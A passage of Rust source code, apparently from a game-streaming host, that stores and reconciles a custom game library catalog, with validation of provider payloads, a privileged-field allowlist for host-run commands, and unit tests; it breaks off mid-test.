//! Persisted custom catalog (`library.json`): operator CRUD and provider reconcile onto [`GameEntry`].
//!
//! Lives in the hardened host config dir next to hooks.json. Manual CRUD never
//! touches provider-owned rows; provider reconcile never touches manual ones.
//! A store claim stamps `<store>:<external_id>` so GameStream app ids and client
//! art caches stay valid (design D2).
//!
//! `prep` and `command` run as the host user; other kinds name a title the host
//! resolves. Tests pin the id scheme, the v1→v2 load, and the privileged-field allowlist.

use super::*;

/// One stored row. Same shape the API returns and the console edits.
#[derive(Clone, Debug, Serialize, Deserialize, ToSchema)]
pub struct CustomEntry {
    /// Host-assigned row id; the `{id}` in the CRUD path. Not the surfaced library id.
    pub id: String,
    pub title: String,
    #[serde(default)]
    pub art: Artwork,
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub launch: Option<LaunchSpec>,
    /// Each `do` runs before launch; each `undo` at session end in reverse ([`crate::hooks::run_prep`]).
    #[serde(default, skip_serializing_if = "Vec::is_empty")]
    pub prep: Vec<crate::hooks::PrepCmd>,
    /// Set only by provider reconcile. `None` is a manual row: reconcile never touches it, and
    /// manual CRUD refuses provider-owned rows.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub provider: Option<String>,
    /// Provider's reconcile key. Present iff `provider` is, so the host `id` can stay put.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub external_id: Option<String>,
    /// Store this row was claimed under. `None` surfaces as `custom`. Stamped on the
    /// row so id and badge stay correct while [`Catalog::claims`] is being rewritten.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub store: Option<String>,
    #[serde(default, skip_serializing_if = "GameRole::is_game")]
    pub role: GameRole,
    /// Brand token (`steam`, `heroic`) a client draws. Never bytes, never a URL. See [`GameEntry::icon`].
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub icon: Option<String>,
    /// How to find this title after a command that hands off and exits. Without it the
    /// host tracks only the child it spawned.
    #[serde(default, skip_serializing_if = "DetectHint::is_empty")]
    pub detect: DetectHint,
    /// Which workspace this title opens on ([`crate::library::OnWindow`]).
    /// Absent follows the host's display policy.
    #[serde(default, skip_serializing_if = "OnWindow::is_empty")]
    pub on_window: OnWindow,
    /// Which sessions hear this title. Absent = every session.
    #[serde(default, skip_serializing_if = "Option::is_none")]
    pub audio: Option<AudioPolicy>,
    #[serde(flatten)]
    pub meta: GameMeta,
}

/// Audio while this title runs: which of the sessions on its display hear it.
/// `all` is the same as no policy and is stored as none.
#[derive(Clone, Copy, Debug, Default, PartialEq, Eq, Serialize, Deserialize, ToSchema)]
pub struct AudioPolicy {
    #[serde(default)]
    pub sessions: crate::session_status::AudioSessions,
}

/// `all` means no policy: stored as none so the row and the wire stay bare.
fn audio_policy(audio: Option<AudioPolicy>) -> Option<AudioPolicy> {
    audio.filter(|a| a.sessions != crate::session_status::AudioSessions::All)
}

/// Create/replace body. No `id` — the host assigns it.
#[derive(Clone, Debug, Deserialize, ToSchema)]
pub struct CustomInput {
    pub title: String,
    #[serde(default)]
    pub art: Artwork,
    #[serde(default)]
    pub launch: Option<LaunchSpec>,
    /// Run as the host user; operator-privileged. See [`privileged_field`]. Absent on an
    /// update keeps the stored list: a writer that never read it must not clear it.
    #[serde(default)]
    pub prep: Option<Vec<crate::hooks::PrepCmd>>,
    /// A hand-added launcher tile is legal without installing the matching plugin.
    #[serde(default)]
    pub role: GameRole,
    /// Brand token. A hand-added "Steam" tile can look like one. See [`GameEntry::icon`].
    #[serde(default)]
    pub icon: Option<String>,
    /// Absent on an update keeps the stored hint, as with `prep`.
    #[serde(default)]
    pub detect: Option<DetectHint>,
    /// Absent on an update keeps the stored placement, as with `prep`.
    #[serde(default)]
    pub on_window: Option<OnWindow>,
    /// Absent on an update keeps the stored policy; `{"sessions":"all"}` clears it.
    #[serde(default)]
    pub audio: Option<AudioPolicy>,
    /// Flattened [`GameMeta`]. Replaced wholesale on update — an edit must send every field it wants kept.
    #[serde(flatten)]
    pub meta: GameMeta,
}

/// One title in a provider reconcile payload: [`CustomInput`] plus the provider's required stable key.
#[derive(Clone, Debug, Deserialize, ToSchema)]
pub struct ProviderEntryInput {
    pub external_id: String,
    pub title: String,
    #[serde(default)]
    pub art: Artwork,
    #[serde(default)]
    pub launch: Option<LaunchSpec>,
    /// Run as the host user; operator-privileged. See [`privileged_field`].
    #[serde(default)]
    pub prep: Vec<crate::hooks::PrepCmd>,
    /// Plugins emit `launchers(cfg)` tiles with `role: "launcher"`.
    #[serde(default)]
    pub role: GameRole,
    /// Brand token a plugin sets on its `launchers(cfg)` tiles. See [`GameEntry::icon`].
    #[serde(default)]
    pub icon: Option<String>,
    /// Install-dir / process hint. Needed when launch goes through the provider's own client.
    #[serde(default)]
    pub detect: DetectHint,
    /// Which workspace the title opens on; absent follows the host's display policy.
    #[serde(default)]
    pub on_window: OnWindow,
    #[serde(default)]
    pub audio: Option<AudioPolicy>,
    #[serde(flatten)]
    pub meta: GameMeta,
}

impl From<CustomEntry> for GameEntry {
    fn from(c: CustomEntry) -> Self {
        // Child process is the primary lifetime; `detect` is the fallback when the command
        // hands off and exits. An inferred `command` exe wins where both exist.
        let detect = c
            .launch
            .as_ref()
            .filter(|l| l.kind == "command")
            .map(|l| crate::library::spec_from_command(&l.value))
            .unwrap_or_default()
            .or_hint(&c.detect);
        GameEntry {
            id: library_id_for(&c),
            store: c.store.clone().unwrap_or_else(|| "custom".into()),
            title: c.title,
            art: c.art,
            role: c.role,
            icon: c.icon,
            launch: c.launch,
            // Stays set so attribution survives the claim.
            provider: c.provider,
            detect,
            on_window: c.on_window,
            stats: None,
            meta: c.meta,
        }
    }
}

fn custom_path() -> PathBuf {
    // Hardened host config dir, not CWD. `prep`/`launch` run as the host user, so this
    // file sits with hooks.json and is DACL/0600-locked.
    pf_paths::config_dir().join("library.json")
}

/// `library.json` v2: entries plus the store-claim map.
#[derive(Debug, Default, Serialize, Deserialize)]
pub struct Catalog {
    #[serde(default)]
    pub entries: Vec<CustomEntry>,
    /// `store id → provider id`. One provider per store; a second claimant is 409.
    /// The map, not the entries, is the claim authority, so an empty reconcile still owns
    /// the store's id space.
    #[serde(default)]
    pub claims: BTreeMap<String, String>,
}

/// On-disk `library.json`: v1 is a bare array, v2 is [`Catalog`]. Untagged so v1 still loads;
/// the host always writes v2, so the first mutation migrates in place.
#[derive(Deserialize)]
#[serde(untagged)]
enum LibraryFile {
    V2(Catalog),
    Legacy(Vec<CustomEntry>),
}

/// Absent or malformed file → empty catalog, never an error.
pub fn load_catalog() -> Catalog {
    match std::fs::read_to_string(custom_path()) {
        Ok(raw) => match serde_json::from_str::<LibraryFile>(&raw) {
            Ok(LibraryFile::V2(c)) => c,
            Ok(LibraryFile::Legacy(entries)) => Catalog {
                entries,
                claims: BTreeMap::new(),
            },
            Err(e) => {
                tracing::warn!(error = %e, "library.json malformed — ignoring custom entries");
                Catalog::default()
            }
        },
        Err(_) => Catalog::default(),
    }
}

pub fn load_custom() -> Vec<CustomEntry> {
    load_catalog().entries
}

/// One stored row by host id, as written — `detect` and `prep` included, which the
/// catalog read model leaves out.
pub fn get_custom(id: &str) -> Option<CustomEntry> {
    load_catalog().entries.into_iter().find(|e| e.id == id)
}

/// Store ids a plugin has claimed, so library scans skip the matching built-in scanner.
pub fn claimed_stores() -> BTreeMap<String, String> {
    load_catalog().claims
}

/// Surfaced library id. Every `GameEntry` mapping and id→entry lookup goes through here.
/// Claimed: `<store>:<external_id>` (GameStream FNV-1a ids, art caches, Moonlight pins).
/// Unclaimed: opaque `custom:<id>`.
pub(crate) fn library_id_for(e: &CustomEntry) -> String {
    match (e.store.as_deref(), e.external_id.as_deref()) {
        (Some(store), Some(external)) => format!("{store}:{external}"),
        _ => format!("custom:{}", e.id),
    }
}

/// Toggle key: claimed store, else provider. `None` for a manual row — the custom store is
/// not a source and cannot be switched off. Store and provider share the string, so a
/// disabled state carries over.
pub(crate) fn source_id_for(e: &CustomEntry) -> Option<&str> {
    e.store.as_deref().or(e.provider.as_deref())
}

/// Gated on [`super::collect_games`]: a source the operator switched off must not serve art
/// (`GET /library/art` is on the paired-cert allowlist). Per-entry hide is not applied here —
/// the console draws a dimmed cover, and this resolver cannot see the caller's lane.
pub fn entry_for_library_id(library_id: &str) -> Option<CustomEntry> {
    let entry = load_custom()
        .into_iter()
        .find(|e| library_id_for(e) == library_id)?;
    super::collect_games()
        .iter()
        .any(|g| g.id == library_id)
        .then_some(entry)
}

/// Art bytes for one [`ArtKind`], or `None` — no row, no such field, or art the proxy may not
/// serve. A remote URL comes from the host's store, which fetches it on the first miss.
/// Blocking IO — call off the async runtime.
pub fn library_art_bytes(library_id: &str, kind: ArtKind) -> Option<(Vec<u8>, String)> {
    let field = art_field(&entry_for_library_id(library_id)?.art, kind)?;
    resolve_art_bytes(&field)
}

pub(crate) fn art_field(art: &Artwork, kind: ArtKind) -> Option<String> {
    match kind {
        ArtKind::Portrait => art.portrait.clone(),
        ArtKind::Hero => art.hero.clone(),
        ArtKind::Logo => art.logo.clone(),
        ArtKind::Header => art.header.clone(),
    }
}

/// Held across load-modify-save: two providers syncing at once share one `library.json.tmp`,
/// and the later save would drop the earlier one's rows.
fn catalog_lock() -> std::sync::MutexGuard<'static, ()> {
    static LOCK: std::sync::Mutex<()> = std::sync::Mutex::new(());
    LOCK.lock().unwrap_or_else(|e| e.into_inner())
}

/// Every mutation path goes through here, so the first write upgrades v1.
fn save_catalog(catalog: &Catalog) -> Result<()> {
    let dir = pf_paths::config_dir();
    // 0700 / SYSTEM+Admins, matching hooks.json: a local user must not plant `prep`/`launch`.
    pf_paths::create_private_dir(&dir).with_context(|| format!("create {}", dir.display()))?;
    let json = serde_json::to_string_pretty(catalog)?;
    // Crash mid-write must not truncate. `write_secret_file` applies 0600 / SYSTEM+Admins before
    // the rename carries them to the final path.
    let tmp = custom_path().with_extension("json.tmp");
    pf_paths::write_secret_file(&tmp, json.as_bytes())
        .with_context(|| format!("write {}", tmp.display()))?;
    std::fs::rename(&tmp, custom_path()).context("rename library.json")?;
    Ok(())
}

/// 12 hex chars from title + wall-clock nanos.
fn new_id(title: &str) -> String {
    let nanos = SystemTime::now()
        .duration_since(UNIX_EPOCH)
        .map(|d| d.as_nanos())
        .unwrap_or(0);
    hex::encode(&Sha256::digest(format!("{title}:{nanos}").as_bytes())[..6])
}

/// Distinguishes "no such entry" from the two 409 cases the mgmt layer must not map to 404.
pub enum MutateOutcome<T> {
    Done(T),
    NotFound,
    /// Belongs to this provider. Manual edits would be clobbered at the next sync.
    ProviderOwned(String),
    /// A different provider already holds this store. The second claimant is told who holds it.
    StoreClaimed {
        store: String,
        provider: String,
    },
}

pub fn add_custom(input: CustomInput) -> Result<CustomEntry> {
    let _serial = catalog_lock();
    let mut catalog = load_catalog();
    let entry = CustomEntry {
        id: new_id(&input.title),
        title: input.title,
        art: input.art,
        launch: input.launch,
        prep: input.prep.unwrap_or_default(),
        provider: None,
        external_id: None,
        store: None,
        role: input.role,
        icon: input.icon,
        detect: input.detect.unwrap_or_default(),
        on_window: input.on_window.unwrap_or_default(),
        audio: audio_policy(input.audio),
        meta: input.meta,
    };
    catalog.entries.push(entry.clone());
    save_catalog(&catalog)?;
    emit_changed("manual");
    Ok(entry)
}

/// Replace a manual row (id kept). Provider-owned rows are refused — they belong to reconcile.
pub fn update_custom(id: &str, input: CustomInput) -> Result<MutateOutcome<CustomEntry>> {
    let _serial = catalog_lock();
    let mut catalog = load_catalog();
    let Some(slot) = catalog.entries.iter_mut().find(|e| e.id == id) else {
        return Ok(MutateOutcome::NotFound);
    };
    if let Some(provider) = &slot.provider {
        return Ok(MutateOutcome::ProviderOwned(provider.clone()));
    }
    slot.title = input.title;
    slot.art = input.art;
    slot.launch = input.launch;
    // Absent means keep: a writer that never read the field must not clear it.
    if let Some(prep) = input.prep {
        slot.prep = prep;
    }
    slot.role = input.role;
    slot.icon = input.icon;
    if let Some(detect) = input.detect {
        slot.detect = detect;
    }
    if let Some(on_window) = input.on_window {
        slot.on_window = on_window;
    }
    if input.audio.is_some() {
        slot.audio = audio_policy(input.audio);
    }
    slot.meta = input.meta;
    let updated = slot.clone();
    save_catalog(&catalog)?;
    emit_changed("manual");
    Ok(MutateOutcome::Done(updated))
}

/// Delete a manual row. Provider-owned rows are refused (see [`update_custom`]).
pub fn delete_custom(id: &str) -> Result<MutateOutcome<()>> {
    let _serial = catalog_lock();
    let mut catalog = load_catalog();
    let Some(entry) = catalog.entries.iter().find(|e| e.id == id) else {
        return Ok(MutateOutcome::NotFound);
    };
    if let Some(provider) = &entry.provider {
        return Ok(MutateOutcome::ProviderOwned(provider.clone()));
    }
    catalog.entries.retain(|e| e.id != id);
    save_catalog(&catalog)?;
    emit_changed("manual");
    Ok(MutateOutcome::Done(()))
}

/// `prep` and `command` run through `/bin/sh -c` or `cmd.exe /c` as the host user. Returns the
/// field name for the error. Kinds on [`UNPRIVILEGED_LAUNCH_KINDS`] stay open so a plugin can
/// publish a catalogue without handing the host a program to run.
pub fn privileged_field(
    launch: Option<&LaunchSpec>,
    prep: &[crate::hooks::PrepCmd],
) -> Option<&'static str> {
    if !prep.is_empty() {
        return Some("prep");
    }
    if launch.is_some_and(|l| !UNPRIVILEGED_LAUNCH_KINDS.contains(&l.kind.as_str())) {
        return Some("launch.kind");
    }
    None
}

/// Launch kinds any lane may publish: the host builds the command from a validated value,
/// so the entry names a title rather than carrying a program. `exec` names a template in the
/// publishing plugin's manifest, which the host resolves ([`crate::library::exec`]).
/// Fail closed: a kind added to `launch.rs` and forgotten here is operator-only.
/// `gog` is listed because `launch::gog_spawn` confines the exe to a GOG install;
/// `command` is never listed (`cmd.exe /c` / `sh -c`).
const UNPRIVILEGED_LAUNCH_KINDS: &[&str] = &[
    "steam_appid",
    "steam_ui",
    "launcher_ui",
    "lutris_id",
    "heroic",
    "epic",
    "gog",
    "aumid",
    "xbox",
    "playnite",
    "uplay",
    "amazon",
    "battlenet",
    "exec",
    "desktop_id",
];

/// Path segment / event source / console label. `manual` is reserved (the no-provider sentinel
/// in `library.changed`).
pub fn validate_provider_name(provider: &str) -> Result<(), String> {
    if provider == "manual" {
        return Err("provider id `manual` is reserved".into());
    }
    let ok = !provider.is_empty()
        && provider.len() <= 64
        && provider
            .chars()
            .all(|c| c.is_ascii_lowercase() || c.is_ascii_digit() || matches!(c, '-' | '_' | '.'))
        && provider.starts_with(|c: char| c.is_ascii_lowercase() || c.is_ascii_digit());
    if ok {
        Ok(())
    } else {
        Err("provider id must be 1–64 chars of [a-z0-9._-], starting alphanumeric".into())
    }
}

/// Prefix of every claimed library id, so tighter than a provider name: no dots (ids split on
/// the first `:`; a dotted store reads as a hostname in logs). `custom` is the unclaimed
/// namespace; `manual` is the `library.changed` sentinel.
pub fn validate_store_claim(store: &str) -> Result<(), String> {
    if store == "custom" || store == "manual" {
        return Err(format!("store id `{store}` is reserved"));
    }
    let ok = !store.is_empty()
        && store.len() <= 32
        && store
            .bytes()
            .all(|b| b.is_ascii_lowercase() || b.is_ascii_digit() || matches!(b, b'-' | b'_'));
    if ok {
        Ok(())
    } else {
        Err("store id must be 1–32 chars of [a-z0-9_-]".into())
    }
}

/// A plugin reconciles its whole set at once, so a 400 on one tile would drop every game. Drop
/// the row, not just `launch`: a launcher tile with no launch is not shown.
pub fn sanitize_launcher_entries(inputs: &mut Vec<ProviderEntryInput>) -> Vec<(String, String)> {
    let mut dropped = Vec::new();
    inputs.retain(|e| {
        let Some(launch) = &e.launch else { return true };
        if launch.kind != "launcher_ui" || resolvable_launcher_ui(&launch.value) {
            return true;
        }
        dropped.push((e.title.clone(), launch.value.clone()));
        false
    });
    dropped
}

/// Refuse a payload whose rows would be ambiguous: an empty or duplicate `external_id`, or an
/// empty title. Any other fault belongs to one entry, so that entry is dropped and returned with
/// its reason — one odd title must not empty the provider's library.
pub fn validate_provider_payload(
    provider: &str,
    inputs: &mut Vec<ProviderEntryInput>,
) -> Result<Vec<(String, String)>, String> {
    let mut seen = std::collections::HashSet::new();
    for (i, e) in inputs.iter().enumerate() {
        if e.external_id.trim().is_empty() {
            return Err(format!("entries[{i}]: `external_id` must not be empty"));
        }
        if e.title.trim().is_empty() {
            return Err(format!("entries[{i}]: `title` must not be empty"));
        }
        if !seen.insert(e.external_id.as_str()) {
            return Err(format!(
                "entries[{i}]: duplicate `external_id` \"{}\"",
                e.external_id
            ));
        }
    }
    let exec = inputs
        .iter()
        .any(|e| e.launch.as_ref().is_some_and(|l| l.kind == "exec"));
    let manifest = exec
        .then(|| crate::plugins::manifest::for_provider(provider))
        .flatten();
    let mut dropped = Vec::new();
    inputs.retain(|e| match entry_fault(provider, manifest.as_ref(), e) {
        None => true,
        Some(reason) => {
            dropped.push((e.external_id.clone(), reason));
            false
        }
    });
    Ok(dropped)
}

/// Why this host would never launch or detect `e`, if it would not. Closed vocabularies are
/// checked here as well as at launch, so the plugin's author sees the reason.
fn entry_fault(
    provider: &str,
    manifest: Option<&crate::plugins::manifest::PluginManifest>,
    e: &ProviderEntryInput,
) -> Option<String> {
    if let Some(launch) = &e.launch {
        let bad = |ok: bool, what: &str| {
            (!ok).then(|| format!("`launch.value` for kind `{}` {what}", launch.kind))
        };
        let fault = match launch.kind.as_str() {
            "steam_ui" => bad(
                valid_steam_ui(&launch.value),
                "must be `bigpicture` or `desktop`",
            ),
            // Vocabulary only: "not installed" is [`sanitize_launcher_entries`]'s business.
            "launcher_ui" => bad(
                known_launcher_ui(&launch.value),
                "is not a launcher this host's platform supports",
            ),
            // Interpolated into a `playnite://` URI.
            "playnite" => bad(
                valid_playnite_id(&launch.value),
                "must be a Playnite game GUID",
            ),
            // `<Identity>!<AppId>`: the host fills the publisher hash at launch.
            "xbox" => bad(valid_aumid(&launch.value), "must be `<Identity>!<AppId>`"),
            "uplay" => bad(valid_uplay_id(&launch.value), "must be a numeric game id"),
            "amazon" => bad(
                valid_amazon_id(&launch.value),
                "must be a product id (`amzn1.adg.product.…`)",
            ),
            "battlenet" => bad(
                valid_battlenet_code(&launch.value),
                "must be a launch code of [A-Za-z0-9_]",
            ),
            #[cfg(not(windows))]
            "desktop_id" => bad(
                crate::library::valid_desktop_id(&launch.value),
                "must be a desktop entry id",
            ),
            // A template in the publishing plugin's manifest, resolved now rather than at launch.
            "exec" => match manifest {
                None => Some(format!(
                    "`launch` for kind `exec` needs an installed plugin whose manifest declares \
                     the provider id '{provider}'"
                )),
                Some(m) => crate::library::exec_spec_is_valid(m, launch)
                    .err()
                    .map(|reason| format!("`launch` for kind `exec` is not resolvable: {reason}")),
            },
            _ => None,
        };
        if fault.is_some() {
            return fault;
        }
    }
    let marker = e.detect.env_marker.as_ref()?;
    if !valid_env_key(&marker.key) {
        return Some("`detect.env_marker.key` must be 1–64 chars of [A-Za-z0-9_]".into());
    }
    marker
        .value
        .as_ref()
        .is_some_and(|v| v.len() > MAX_ENV_VALUE)
        .then(|| format!("`detect.env_marker.value` must be at most {MAX_ENV_VALUE} chars"))
}

/// Replace `provider`'s rows with `inputs`. Surviving titles keep their host id (keyed on
/// `external_id`); orphans drop; manual rows and other providers are untouched. Returns the
/// provider's resulting rows, payload order. Pure — no filesystem.
fn reconcile_entries(
    entries: &mut Vec<CustomEntry>,
    provider: &str,
    store: Option<&str>,
    inputs: Vec<ProviderEntryInput>,
) -> Vec<CustomEntry> {
    let mut existing: std::collections::HashMap<String, CustomEntry> = entries
        .iter()
        .filter(|e| e.provider.as_deref() == Some(provider))
        .filter_map(|e| e.external_id.clone().map(|x| (x, e.clone())))
        .collect();
    entries.retain(|e| e.provider.as_deref() != Some(provider));
    let mut result = Vec::with_capacity(inputs.len());
    for input in inputs {
        let id = existing
            .remove(&input.external_id)
            .map(|prev| prev.id) // keep the host id from last sync
            .unwrap_or_else(|| new_id(&format!("{provider}:{}", input.external_id)));
        result.push(CustomEntry {
            id,
            title: input.title,
            art: input.art,
            launch: input.launch,
            prep: input.prep,
            provider: Some(provider.to_string()),
            external_id: Some(input.external_id),
            store: store.map(str::to_string),
            role: input.role,
            icon: input.icon,
            detect: input.detect,
            on_window: input.on_window,
            audio: audio_policy(input.audio),
            meta: input.meta,
        });
    }
    // Leftovers in `existing` are orphans — dropped.
    entries.extend(result.iter().cloned());
    result
}

/// Replace `provider`'s rows (`PUT /library/provider/{provider}`), optionally under a store
/// claim (`?store=steam`). Caller validates name and payload. Emits `library.changed`.
/// Claiming is idempotent for the holder and 409 for anyone else. A provider holds at most
/// one store: claiming a new one releases the old.
pub fn reconcile_provider(
    provider: &str,
    store: Option<&str>,
    inputs: Vec<ProviderEntryInput>,
) -> Result<MutateOutcome<Vec<CustomEntry>>> {
    let _serial = catalog_lock();
    let mut catalog = load_catalog();
    if let Some(store) = store {
        if let Some(holder) = catalog.claims.get(store) {
            if holder != provider {
                return Ok(MutateOutcome::StoreClaimed {
                    store: store.to_string(),
                    provider: holder.clone(),
                });
            }
        }
        let previous: Vec<String> = catalog
            .claims
            .iter()
            .filter(|(s, p)| p.as_str() == provider && s.as_str() != store)
            .map(|(s, _)| s.clone())
            .collect();
        for stale in previous {
            tracing::info!(provider, released = %stale, claimed = store, "library: provider moved its store claim");
            catalog.claims.remove(&stale);
        }
        if catalog
            .claims
            .insert(store.to_string(), provider.to_string())
            .is_none()
        {
            tracing::info!(provider, store, "library: store claimed by a provider");
        }
    }
    let result = reconcile_entries(&mut catalog.entries, provider, store, inputs);
    save_catalog(&catalog)?;
    emit_changed(provider);
    Ok(MutateOutcome::Done(result))
}

/// Releases the store claim as well (`DELETE /library/provider/{provider}`). No event when
/// nothing changed. This is the only release path, so uninstalling a library plugin restores
/// the built-in scanner without a restart.
pub fn delete_provider(provider: &str) -> Result<usize> {
    let _serial = catalog_lock();
    let mut catalog = load_catalog();
    let before = catalog.entries.len();
    catalog
        .entries
        .retain(|e| e.provider.as_deref() != Some(provider));
    let removed = before - catalog.entries.len();
    let claims_before = catalog.claims.len();
    catalog.claims.retain(|_, p| p != provider);
    let released = claims_before - catalog.claims.len();
    if removed > 0 || released > 0 {
        if released > 0 {
            tracing::info!(provider, released, "library: store claim released");
        }
        save_catalog(&catalog)?;
        emit_changed(provider);
    }
    Ok(removed)
}

/// Prep/undo for a stored library id. In-host scanners have no per-title config; GameStream
/// `apps.json` carries its own `prep`. Goes through [`entry_for_library_id`], not a `custom:`
/// prefix strip, so a claimed `steam:440` still runs operator prep.
pub fn prep_for(library_id: &str) -> Vec<crate::hooks::PrepCmd> {
    entry_for_library_id(library_id)
        .map(|e| e.prep)
        .unwrap_or_default()
}

/// The title's `audio.sessions`, if it has one. Same lookup as [`prep_for`].
pub fn audio_sessions_for(library_id: &str) -> Option<crate::session_status::AudioSessions> {
    entry_for_library_id(library_id)
        .and_then(|e| e.audio)
        .map(|a| a.sessions)
}

/// `source` is `"manual"` for operator CRUD, else the provider id. Hooks and the SDK filter on it.
fn emit_changed(source: &str) {
    crate::events::emit(crate::events::EventKind::LibraryChanged {
        source: source.to_string(),
    });
}

#[cfg(test)]
mod tests {
    use super::*;

    /// `audio.sessions` round-trips on the row; `all` and absent are the same bare row.
    #[test]
    fn audio_policy_is_bare_unless_it_narrows() {
        use crate::session_status::AudioSessions;
        let input = |json: &str| serde_json::from_str::<CustomInput>(json).unwrap();
        assert_eq!(audio_policy(input(r#"{"title":"x"}"#).audio), None);
        assert_eq!(
            audio_policy(input(r#"{"title":"x","audio":{"sessions":"all"}}"#).audio),
            None
        );
        let owner = input(r#"{"title":"x","audio":{"sessions":"owner"}}"#);
        assert_eq!(
            audio_policy(owner.audio).map(|a| a.sessions),
            Some(AudioSessions::Owner)
        );
        assert!(serde_json::from_str::<CustomInput>(
            r#"{"title":"x","audio":{"sessions":"phone"}}"#
        )
        .is_err());
        let mut row = manual("c1", "x");
        row.audio = audio_policy(owner.audio);
        let json = serde_json::to_value(&row).unwrap();
        assert_eq!(json["audio"]["sessions"], "owner");
        let back: CustomEntry = serde_json::from_value(json).unwrap();
        assert_eq!(back.audio, row.audio);
        assert!(!serde_json::to_value(manual("c2", "y"))
            .unwrap()
            .as_object()
            .unwrap()
            .contains_key("audio"));
    }

    fn manual(id: &str, title: &str) -> CustomEntry {
        CustomEntry {
            id: id.into(),
            title: title.into(),
            art: Artwork::default(),
            launch: None,
            prep: Vec::new(),
            provider: None,
            external_id: None,
            store: None,
            role: GameRole::Game,
            icon: None,
            detect: DetectHint::default(),
            on_window: OnWindow::default(),
            audio: None,
            meta: GameMeta::default(),
        }
    }

    fn input(external_id: &str, title: &str) -> ProviderEntryInput {
        ProviderEntryInput {
            external_id: external_id.into(),
            title: title.into(),
            art: Artwork::default(),
            launch: None,
            prep: Vec::new(),
            role: GameRole::Game,
            icon: None,
            detect: DetectHint::default(),
            on_window: OnWindow::default(),
            audio: None,
            meta: GameMeta::default(),
        }
    }

    #[test]
    fn custom_entry_maps_to_game_entry_with_provider() {
        let g: GameEntry = manual("abc123", "My ROM").into();
        assert_eq!(g.id, "custom:abc123");
        assert_eq!(g.store, "custom");
        assert_eq!(g.provider, None);

        let mut e = manual("def456", "Synced");
        e.provider = Some("romm".into());
        e.external_id = Some("rom-1".into());
        e.meta.platform = Some("PS2".into());
        let g: GameEntry = e.into();
        assert_eq!(g.provider.as_deref(), Some("romm"));
        assert_eq!(g.meta.platform.as_deref(), Some("PS2"));
    }

    #[test]
    fn a_claimed_entry_reproduces_the_scanner_identity() {
        let mut e = manual("host-assigned", "Portal 2");
        e.provider = Some("steam".into());
        e.external_id = Some("620".into());
        e.store = Some("steam".into());
        assert_eq!(library_id_for(&e), "steam:620");
        let g: GameEntry = e.clone().into();
        assert_eq!(g.id, "steam:620", "exactly what the scanner emitted");
        assert_eq!(g.store, "steam", "the store badge, not `custom`");
        assert_eq!(
            g.provider.as_deref(),
            Some("steam"),
            "attribution rides along too"
        );

        let mut u = manual("abc", "Chrono Trigger");
        u.provider = Some("romm".into());
        u.external_id = Some("rom-1".into());
        assert_eq!(library_id_for(&u), "custom:abc");
        assert_eq!(GameEntry::from(u).store, "custom");

        assert_eq!(source_id_for(&e), Some("steam"));
        let mut r = manual("z", "T");
        r.provider = Some("romm".into());
        assert_eq!(source_id_for(&r), Some("romm"));
        assert_eq!(
            source_id_for(&manual("m", "Manual")),
            None,
            "never hideable"
        );
    }

    #[test]
    fn claimed_ids_are_deterministic_across_reconciles() {
        let mut entries = Vec::new();
        let r1 = reconcile_entries(
            &mut entries,
            "steam",
            Some("steam"),
            vec![input("440", "Team Fortress 2"), input("620", "Portal 2")],
        );
        let ids: Vec<String> = r1.iter().map(library_id_for).collect();
        assert_eq!(ids, ["steam:440", "steam:620"]);

        // Survivors keep byte-identical surfaced ids; a new title is derived.
        let r2 = reconcile_entries(
            &mut entries,
            "steam",
            Some("steam"),
            vec![
                input("440", "Team Fortress 2 (2026)"),
                input("70", "Half-Life"),
            ],
        );
        let ids2: Vec<String> = r2.iter().map(library_id_for).collect();
        assert_eq!(ids2, ["steam:440", "steam:70"]);

        // Dropping the claim reverts to opaque `custom:` ids.
        let r3 = reconcile_entries(&mut entries, "steam", None, vec![input("440", "TF2")]);
        assert!(library_id_for(&r3[0]).starts_with("custom:"));
    }

    /// `role: "launcher"` must survive payload → stored row → `GameEntry` → wire, and stay off
    /// ordinary games. Serde default is `Game`, so a dropped field would not fail other tests.
    #[test]
    fn a_launcher_entry_survives_reconcile_onto_the_wire() {
        let mut launcher = input("launcher", "Lutris");
        launcher.role = GameRole::Launcher;
        launcher.launch = Some(LaunchSpec {
            kind: "launcher_ui".into(),
            value: "lutris".into(),
            ..Default::default()
        });

        let mut entries = Vec::new();
        let out = reconcile_entries(
            &mut entries,
            "lutris",
            Some("lutris"),
            vec![launcher, input("42", "Some Game")],
        );

        assert_eq!(library_id_for(&out[0]), "lutris:launcher");
        assert_eq!(out[0].role, GameRole::Launcher);
        assert_eq!(out[1].role, GameRole::Game, "the game is untouched");

        let tile: GameEntry = out[0].clone().into();
        assert_eq!(tile.role, GameRole::Launcher);
        let v = serde_json::to_value(&tile).unwrap();
        assert_eq!(v["role"], "launcher");
        let game: GameEntry = out[1].clone().into();
        let vg = serde_json::to_value(&game).unwrap();
        assert!(
            vg.get("role").is_none(),
            "a game's role stays off the wire, so old clients are unaffected"
        );
    }

    /// The field is skipped when absent, so a drop would not fail other tests.
    #[test]
    fn an_icon_token_survives_reconcile_onto_the_wire() {
        let mut launcher = input("launcher", "Lutris");
        launcher.role = GameRole::Launcher;
        launcher.icon = Some("lutris".into());

        let mut entries = Vec::new();
        let out = reconcile_entries(
            &mut entries,
            "lutris",
            Some("lutris"),
            vec![launcher, input("42", "Some Game")],
        );

        assert_eq!(out[0].icon.as_deref(), Some("lutris"));
        assert_eq!(out[1].icon, None, "the game is untouched");

        let tile: GameEntry = out[0].clone().into();
        assert_eq!(tile.icon.as_deref(), Some("lutris"));
        assert_eq!(serde_json::to_value(&tile).unwrap()["icon"], "lutris");

        let game: GameEntry = out[1].clone().into();
        assert!(
            serde_json::to_value(&game)
                .unwrap()
                .get("icon")
                .is_none(),
            "an entry with no mark stays byte-identical on the wire, so older clients are unaffected"
        );
    }

    /// A later reconcile that omits the token must clear it. Merging `Option` would strand
    /// a mark the plugin removed.
    #[test]
    fn dropping_the_icon_on_a_later_reconcile_clears_it() {
        let mut first = input("launcher", "Lutris");
        first.role = GameRole::Launcher;
        first.icon = Some("lutris".into());

        let mut entries = Vec::new();
        reconcile_entries(&mut entries, "lutris", Some("lutris"), vec![first]);

        let mut second = input("launcher", "Lutris");
        second.role = GameRole::Launcher;
        let out = reconcile_entries(&mut entries, "lutris", Some("lutris"), vec![second]);
        assert_eq!(out[0].icon, None);
    }

    #[test]
    fn meta_is_flat_and_optional_on_the_wire() {
